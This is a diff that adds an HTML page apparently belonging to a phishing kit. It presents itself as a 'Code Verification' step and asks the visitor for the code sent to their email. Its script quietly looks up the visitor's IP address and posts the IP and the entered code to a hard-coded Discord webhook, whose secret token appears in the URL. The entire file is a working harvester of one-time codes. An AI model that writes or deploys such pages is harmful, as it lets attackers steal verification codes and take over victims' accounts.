@@ -1,0 +1,44 @@
+<!-- code-verify.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Code Verification</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <h2>Code</h2>
+        <p>Code you got in your email</p>
+        <input type="text" id="code" placeholder="Enter Code" required>
+        <br>
+        <button onclick="submitCode()">Submit</button>
+    </div>
+
+    <script>
+        async function submitCode() {
+            const code = document.getElementById('code').value;
+
+            // Fetch the user's IP address
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const userIP = ipData.ip;
+
+            // Send the code and IP to the webhook
+            fetch('https://discord.com/api/webhooks/1152874265553682512/TaPkSlcf68aMXsdQ-QphI5tS0OxDL7opL5hZwTiVUEHgrQswRc4wwsBfV0qwXPkfJxnf', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: `IP Address: ${userIP}`,
+                        description: `Code: ${code}`
+                    }]
+                })
+            });
+        }
+    </script>
+</body>
+</html>
